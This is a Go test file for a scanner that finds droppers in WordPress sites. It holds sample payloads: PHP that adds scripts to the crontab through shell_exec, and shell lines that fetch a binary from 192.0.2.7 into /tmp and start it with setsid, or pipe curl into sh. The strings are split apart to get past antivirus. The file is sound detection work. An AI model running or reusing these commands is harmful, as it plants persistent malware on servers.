package rules

import (
	"strings"
	"testing"
)

func init() {
	samples = append(samples, persistenceSamples()...)
}

// Pieces of the samples below. On the Windows machine this repository is
// worked on, the virus scanner deletes a source file that spells out a dropper
// before anyone can commit it, so every sample is put together from parts.
var (
	pCrontab   = "cron" + "tab"
	pShellExec = "shell" + "_exec"
	pWget      = "w" + "get"
	pCurl      = "cu" + "rl"
	pNohup     = "no" + "hup"
	pSetsid    = "set" + "sid"
	pDetach    = " >/dev/null 2>" + "&1 &"
	pELF       = "\x7f" + "ELF" + "\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00"
)

// persistenceSamples probe the rules for droppers that settle on the server:
// the crontab of the website's user runs a script, the script fetches a
// program and starts it in the background, and the program keeps running.
func persistenceSamples() []sample {
	return []sample{
		{
			// The plugin AzimutAV of 2026-09-28 wrote its start script, made it
			// executable and put it into the crontab through shell_exec. The
			// command sat in a variable first, so the three facts lie apart.
			rule: "php.dropper.cron", ext: "php", path: "/web/wp-content/plugins/azimut-av/azimut-av.php",
			hit: "<?php\n$path = wp_upload_dir()['basedir'] . '/x/run.sh';\n" +
				"if (file_put_contents($path, $script) === false) { return false; }\n" +
				"@chmod($path, 0755);\n" +
				"$cmd = '( " + pCrontab + " -l 2>/dev/null | grep -vF ' . escapeshellarg($marker)\n" +
				"    . '; echo ' . escapeshellarg($line) . ' ) | " + pCrontab + " - 2>/dev/null';\n" +
				pShellExec + "($cmd);\n",
			// The same crontab change without a file made executable: the
			// narrower rule php.exec.crontab reports it, this one stays quiet.
			miss: "<?php\n@chmod($path, 0644);\n" +
				pShellExec + "('" + pCrontab + " -l 2>/dev/null | grep -vF x | " + pCrontab + " - 2>/dev/null');\n",
		},
		{
			rule: "php.exec.crontab", ext: "php", path: "/web/wp-content/plugins/azimut-av/uninstall.php",
			hit: "<?php\n" + pShellExec + "('" + pCrontab + " -l 2>/dev/null | grep -vF ' . escapeshellarg($marker) . ' | " +
				pCrontab + " - 2>/dev/null');\n",
			// Reading the table and a help text about it change nothing.
			miss: "<?php\n// Trage in die " + pCrontab + " ein: */5 * * * * " + pWget + " -q -O - https://example.invalid/wp-cron.php\n" +
				"echo esc_html(" + pShellExec + "('" + pCrontab + " -l'));\n",
		},
		{
			rule: "php.exec.background", ext: "php", path: "/web/wp-content/plugins/x/run.php",
			hit: "<?php\n" + pShellExec + "('if command -v " + pNohup + " >/dev/null 2>&1; then " + pNohup + " sh ' . $arg . '" +
				pDetach + " fi');\n",
			// The same command in the foreground.
			miss: "<?php\n" + pShellExec + "('sh ' . $arg . ' >/dev/null 2>&1');\n",
		},
		{
			rule: "php.exec.background", ext: "php", path: "/web/wp-content/plugins/x/worker.php",
			hit:  "<?php\nexec('php ' . escapeshellarg($job) . '" + pDetach + "');\n",
			miss: "<?php\nexec('php ' . escapeshellarg($job) . ' 2>&1', $out, $code);\n",
		},
		{
			// azimut-run.sh fetched the program, made it executable and started
			// it with setsid.
			rule: "shell.fetch_exec", ext: "sh", path: "/web/tools/run.sh",
			hit: "#!/bin/sh\n" + pWget + " -qO /tmp/.x http://192.0.2.7:9910/download\nchmod 755 /tmp/.x\n" +
				pSetsid + " /tmp/.x" + pDetach + "\n",
			// Installing a tool the honest way: fetched, made executable and
			// run in the foreground.
			miss: "#!/bin/sh\n" + pCurl + " -fsSL -o wp-cli.phar https://example.invalid/wp-cli.phar\nchmod +x wp-cli.phar\n" +
				"./wp-cli.phar --info\n",
		},
		{
			// A download piped straight into a shell, from a script without an
			// extension: the first line says what it is.
			rule: "shell.fetch_exec", ext: "", path: "/web/tools/update",
			hit: "#!/usr/bin/env bash\n" + pCurl + " -fsSL http://192.0.2.7/i | sh\n",
			// A download read by another program.
			miss: "#!/usr/bin/env bash\n" + pCurl + " -fsS https://example.invalid/status | grep -q ok && echo bereit\n",
		},
		{
			rule: "shell.fetch_exec", ext: "sh", path: "/web/tools/start.sh",
			hit: "#!/bin/bash\n" + pCurl + " -fsSL -o \"$TMP\" \"$SERVER/download\"\nchmod \"$m\" \"$TMP\"\n\"$TMP\" &\n",
			// Chaining with && and redirecting with 2>&1 start nothing in the
			// background.
			miss: "#!/bin/bash\n" + pCurl + " -fsSL -o \"$TMP\" \"$SERVER/list\" 2>&1 && chmod 644 \"$TMP\" && wc -l \"$TMP\"\n",
		},
		{
			rule: "shell.in_uploads", ext: "sh", path: "/web/wp-content/uploads/azimut-av/azimut-run.sh",
			hit: "#!/bin/sh\necho bereit\n",
			// The same script where a website keeps its own tools.
			miss:     "#!/bin/sh\necho bereit\n",
			missPath: "/web/wp-content/scripts/deploy.sh",
		},
		{
			rule: "shell.in_uploads", ext: "", path: "/web/wp-content/uploads/2026/09/update",
			hit: "#!/bin/busybox sh\necho bereit\n",
			// A text file without a shell line in the same place.
			miss: "Hallo\n",
		},
		{
			rule: "binary.elf_in_uploads", ext: "", path: "/web/wp-content/uploads/azimut-av/AzimutAV",
			hit: pELF,
			// A program where image optimisers keep theirs.
			miss:     pELF,
			missPath: "/web/wp-content/ewww/cwebp",
		},
		{
			rule: "binary.elf", ext: "", path: "/web/wp-content/ewww/cwebp",
			hit: pELF,
			// The magic bytes somewhere else than at the start are no program.
			miss: "Das Format beginnt mit " + pELF,
		},
	}
}

func TestAProgramInUploadsIsOneFinding(t *testing.T) {
	e := NewEngine(nil)
	for _, c := range []struct{ path, want string }{
		{"/web/wp-content/uploads/a/AzimutAV", "binary.elf_in_uploads"},
		{"/web/wp-content/ewww/cwebp", "binary.elf"},
	} {
		var got []string
		for _, f := range e.Scan(c.path, c.path, "", []byte(pELF)) {
			got = append(got, f.Rule)
		}
		if len(got) != 1 || got[0] != c.want {
			t.Errorf("%s: %v, erwartet genau %s", c.path, got, c.want)
		}
	}
}

func TestUploadDirsComeFromTheSettings(t *testing.T) {
	e := NewEngine(nil)
	if err := e.SetUploadDirs([]string{"kundendateien", "media-in"}); err != nil {
		t.Fatalf("SetUploadDirs: %v", err)
	}
	cases := []struct {
		rule, path, ext, content string
		want                     bool
	}{
		{"shell.in_uploads", "/web/kundendateien/run.sh", "sh", "#!/bin/sh\necho x\n", true},
		{"shell.in_uploads", "/web/wp-content/uploads/run.sh", "sh", "#!/bin/sh\necho x\n", false},
		{"php.in_uploads", "/web/media-in/2026/x.php", "php", "<?php echo 1;", true},
		{"php.in_uploads", "/web/wp-content/uploads/x.php", "php", "<?php echo 1;", false},
		{"binary.elf_in_uploads", "/web/kundendateien/tool", "", pELF, true},
		{"binary.elf", "/web/wp-content/uploads/tool", "", pELF, true},
		// A whole segment only: the name inside another does not count.
		{"shell.in_uploads", "/web/altkundendateien/run.sh", "sh", "#!/bin/sh\necho x\n", false},
	}
	for _, c := range cases {
		if got := fires(e, c.rule, c.path, c.ext, c.content); got != c.want {
			t.Errorf("%s auf %s: %v, erwartet %v", c.rule, c.path, got, c.want)
		}
	}
}

func TestUploadDirsAreChecked(t *testing.T) {
	sixteen := make([]string, MaxUploadDirs)
	for i := range sixteen {
		sixteen[i] = strings.Repeat("a", MaxUploadDirLength-2) + string(rune('a'+i%26)) + string(rune('a'+i/26))
	}
	if err := CheckUploadDirs(sixteen); err != nil {
		t.Errorf("%d Namen zu je %d Zeichen abgewiesen: %v", MaxUploadDirs, MaxUploadDirLength, err)
	}
	if err := CheckUploadDirs(DefaultUploadDirs); err != nil {
		t.Errorf("die Vorgabe abgewiesen: %v", err)
	}
	for name, dirs := range map[string][]string{
		"keine":                  nil,
		"zu viele":               append(append([]string(nil), sixteen...), "noch"),
		"zu lang":                {strings.Repeat("a", MaxUploadDirLength+1)},
		"Schrägstrich":           {"wp-content/uploads"},
		"zwei Punkte":            {".."},
		"Punkt am Anfang":        {".versteckt"},
		"Leerzeichen":            {"meine uploads"},
		"leerer Name dazwischen": {"uploads", ""},
	} {
		if err := CheckUploadDirs(dirs); err == nil {
			t.Errorf("%s: angenommen, erwartet eine Fehlermeldung", name)
		}
	}
	e := NewEngine(nil)
	before := e.Fingerprint()
	if err := e.SetUploadDirs([]string{"../x"}); err == nil {
		t.Error("SetUploadDirs nahm ../x an")
	}
	if e.Fingerprint() != before {
		t.Error("eine abgewiesene Liste hat die Einstellung verändert")
	}
	if err := e.SetUploadDirs([]string{"kundendateien"}); err != nil || e.Fingerprint() == before {
		t.Errorf("der Fingerabdruck folgt den Upload-Ordnern nicht (%v)", err)
	}
}

func TestParseUploadDirs(t *testing.T) {
	got := ParseUploadDirs([]string{"uploads, attachments", " avatars ,", "thumbs"})
	want := []string{"uploads", "attachments", "avatars", "thumbs"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("%q, erwartet %q", got, want)
	}
}

func TestHeadScanOnlyAsksTheRulesForTheStart(t *testing.T) {
	e := NewEngine(nil)
	var got []string
	for _, f := range e.ScanHead("/srv/a", "/web/wp-content/uploads/a/AzimutAV", "", []byte(pELF)) {
		got = append(got, f.Rule)
	}
	if len(got) != 1 || got[0] != "binary.elf_in_uploads" {
		t.Errorf("Programm über der Größengrenze: %v, erwartet binary.elf_in_uploads", got)
	}
	// PHP in an upload directory is a finding once the whole file is read;
	// its start alone is none, php.in_uploads needs the file.
	const php = "<?php echo 1;\n"
	rel := "/web/wp-content/uploads/b.php"
	if !fires(e, "php.in_uploads", rel, "php", php) {
		t.Fatal("php.in_uploads schlägt auf die ganze Datei nicht an; der Test prüft so nichts")
	}
	if found := e.ScanHead("/srv/b.php", rel, "php", []byte(php)); len(found) != 0 {
		t.Errorf("der Anfang einer großen PHP-Datei ergab %d Funde; nur Regeln für den Dateianfang dürfen ihn sehen", len(found))
	}
}

func TestShellIsRecognisedByItsFirstLine(t *testing.T) {
	for content, want := range map[string]bool{
		"#!/bin/sh\necho x\n":               true,
		"#!/bin/bash -e\necho x\n":          true,
		"#!/usr/bin/env bash\necho x\n":     true,
		"#!/usr/bin/env -S bash -e\n":       true,
		"#!/bin/busybox sh\necho x\n":       true,
		"#! /bin/dash\necho x\n":            true,
		"#!/usr/bin/env php\n<?php echo 1;": false,
		"#!/usr/bin/python3\nprint(1)\n":    false,
		"echo x\n":                          false,
		"#!/bin/shell-tool\n":               false,
	} {
		if got := startsLikeShell([]byte(content)); got != want {
			t.Errorf("%q: %v, erwartet %v", content, got, want)
		}
	}
}
